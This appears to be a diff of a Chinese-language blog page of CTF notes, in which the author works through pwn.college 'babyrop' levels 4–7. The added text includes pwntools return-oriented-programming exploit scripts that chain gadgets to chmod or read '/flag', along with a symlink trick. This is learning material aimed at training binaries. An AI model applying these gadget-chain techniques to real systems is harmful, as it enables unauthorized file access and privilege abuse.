@@ -29,9 +29,11 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220503162403150.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505210342026.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506101348091.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506104816965.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-05T14:45:54.657Z">
+<meta property="article:modified_time" content="2022-05-06T06:05:10.237Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -217,7 +219,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      60k 字
+      61k 字
     </span>
   
 
@@ -226,7 +228,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      746 分钟
+      767 分钟
     </span>
   
 
@@ -267,7 +269,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月5日 晚上
+                  不可视境界线最后变动于：2022年5月6日 下午
                 
               </p>
             
@@ -1532,11 +1534,46 @@
 <img src="../../image/pwn-modules/image-20220505210342026.png" srcset="/img/loading.gif" lazyload alt="image-20220505210342026" style="zoom:80%;" />
 
 <p>利用这几个gadgets就可以实现chmod系统调用了. (或者execve)</p>
-<p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. <code>rbp=0x7fffffffe1e0</code> </p>
+<p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. </p>
 <p>好吧, 这栈地址会变化的. 大意了, 栈帧底部有一个变量.</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这和上一题区别何在? 干脆都做一遍.</p>
+<h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这一题在上一题的基础之上, 没有提示buf的所在位置.</p>
+<p>突然想起来babyjail里面有一个openat. 我或许可以用<code>fchmodat</code>.</p>
+<p>想出来了一个奇奇怪怪的方法, 在IDA中搜索到了字节序列<code>&#39;\x66\x00&#39;</code>, 就是字符串<code>f\0</code>的表示,<br>在这之前要先使用<code>ln -s /flag /home/hacker/f</code>命令来创建符号链接, 再使用python来生成input,<br>最后再命令行中这样执行文件<code>/challenge/babyrop_level5.1 &lt;input 6&lt;.</code>, 这样就行了.<br>或许可以使用别的字符串. 比如一些函数名.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#连续装四个参数和rax系统调用号.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d7b</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x401d63</span>, <span class="hljs-number">0x403EC8</span>, <span class="hljs-number">0x401d5c</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401d54</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d74</span>, <span class="hljs-number">268</span>, <span class="hljs-number">0x401d8b</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure>
+
+<p>想出来这个是因为不知道怎么leak栈上的地址, 估计下几个level得直接完蛋吧…….</p>
+<p><del>看以前的ctf发现也许可以使用write函数来打印栈上的内容, 肯定有一个指向栈上的指针的. 比如说main的rbp.</del>没事了, write的地址也得是指向栈的指针, 属于是鸡和蛋的问题, 暂时没有新方法.</p>
+<h4 id="level6-4"><a href="#level6-4" class="headerlink" title="level6"></a>level6</h4><p>这次没有了syscall, 只有一个现成的函数<code>force_import</code>, gadget也少了几个. 不过也简单. 保护没有变化.</p>
+<img src="../../image/pwn-modules/image-20220506101348091.png" srcset="/img/loading.gif" lazyload alt="image-20220506101348091" style="zoom:80%;" />
+
+<p>再加上challenge结束时的寄存器值:</p>
+<img src="../../image/pwn-modules/image-20220506104816965.png" srcset="/img/loading.gif" lazyload alt="image-20220506104816965" style="zoom:80%;" />
+
+<p>这样的话只要改改rdi rsi. (open多参数到底有没有问题???)</p>
+<ul>
+<li>但是rsi同时作为open的oflag和sendfile的in_fd, 按理来说open一般会开出来3, 那么oflag就得是3了, 但很明显不能是3, 这样标志位会有冲突. 那么用一个文件占用fd3, 这样就会开到4. 如果oflag是4的话会被识别为只读. </li>
+<li>接下来就是rdi的问题, open的参数是一个指向字符串的地址(‘e’, null-terminal string at 0x400457), 还要被用在sendfile的out_fd中, 而fd是int类型, 加上文件固定低地址执行, 这样子还要在命令行中开一个fd为4195415(0x400457)的输出文件.</li>
+</ul>
+<p>然后发现bash并不能打开超过9的fd. 由操作系统分配的fd, bash是怎么控制的? 为什么只提供0-9?</p>
+<p>一次执行这个函数有困难也可以执行两次.</p>
+<ul>
+<li>第一次open(‘e’, 4), send(‘f’, 4, 0, 0x7f……), sendfile失败.</li>
+<li>第二次直接跳到sendfile(1, 3, 0, 60), 因为open函数会修改rdi rsi等等, 从函数入口开始执行那ROP设置的寄存器值就失效了.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401b6a</span>, <span class="hljs-number">0x400458</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401B3F</span>])<br>pl+= flat([<span class="hljs-number">0x401b6a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x401b7a</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401b72</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0x401B56</span>, <span class="hljs-number">0</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<ul>
+<li>我开了aslr才能在gdb里面进行输入, 具体原因未知.</li>
+<li>搞清楚了open的一些东西<ul>
+<li>oflag用4字节中最低2bits表示, 按数值区别. mode参数只有在创建新文件的时候使用, <strong>一般可忽略</strong>.</li>
+<li>libc中的open函数最终都会调用openat, 这样既能接受绝对地址也能接受相对地址.</li>
+</ul>
+</li>
+</ul>
+<h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><p>直接给我system函数的地址.</p>
 <h1 id="module-B"><a href="#module-B" class="headerlink" title="module B"></a>module B</h1><p>Dynamic Allocators:</p>
 <ul>
 <li>**General Purpose:**Doug Lea (pictured) releases dlmalloc into public domain in 1987.</li>
